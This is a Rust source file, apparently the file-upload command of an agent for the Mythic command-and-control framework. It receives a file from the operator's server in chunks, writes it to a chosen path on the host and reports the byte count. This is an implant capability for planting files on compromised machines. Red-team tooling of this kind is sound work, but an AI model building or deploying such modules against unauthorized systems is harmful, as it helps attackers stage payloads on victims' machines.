use crate::structs::{GetFileFromMythicStruct, Task};
use serde::Deserialize;
use tokio::io::AsyncWriteExt;
use tokio::sync::mpsc;

#[derive(Deserialize)]
struct UploadArgs {
    file_id: String,
    remote_path: String,
    #[serde(default)]
    overwrite: bool,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: UploadArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse parameters: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    // Check if file exists and overwrite not set
    if !args.overwrite && tokio::fs::metadata(&args.remote_path).await.is_ok() {
        response.set_error("File already exists. Set overwrite to true.");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    let (chunk_tx, mut chunk_rx) = mpsc::channel::<Vec<u8>>(10);

    let get_msg = GetFileFromMythicStruct {
        task_id: task.data.task_id.clone(),
        full_path: args.remote_path.clone(),
        file_id: args.file_id.clone(),
        send_user_status_updates: true,
        received_chunk_channel: chunk_tx,
        tracking_uuid: String::new(),
        send_responses: task.job.send_responses.clone(),
        file_transfers: task.job.file_transfers.clone(),
    };

    if task.job.get_file_from_mythic.send(get_msg).await.is_err() {
        response.set_error("Failed to request file from Mythic");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    // Open destination file and stream chunks directly to disk to avoid
    // buffering the entire file in memory.
    let mut file = match tokio::fs::File::create(&args.remote_path).await {
        Ok(f) => f,
        Err(e) => {
            response.set_error(&format!("Failed to create file: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let mut total_bytes = 0usize;
    let mut write_error: Option<String> = None;
    while let Some(chunk) = chunk_rx.recv().await {
        if chunk.is_empty() {
            // Empty chunk signals completion from the file transfer handler
            break;
        }
        total_bytes += chunk.len();
        if let Err(e) = file.write_all(&chunk).await {
            write_error = Some(format!("Failed to write chunk: {}", e));
            break;
        }
    }

    if let Err(e) = file.flush().await {
        write_error = Some(format!("Failed to flush file: {}", e));
    }

    match write_error {
        Some(e) => {
            // Best-effort cleanup of partial file
            let _ = tokio::fs::remove_file(&args.remote_path).await;
            response.set_error(&e);
        }
        None => {
            response.user_output = format!("Uploaded {} bytes to {}", total_bytes, args.remote_path);
            response.completed = true;
        }
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
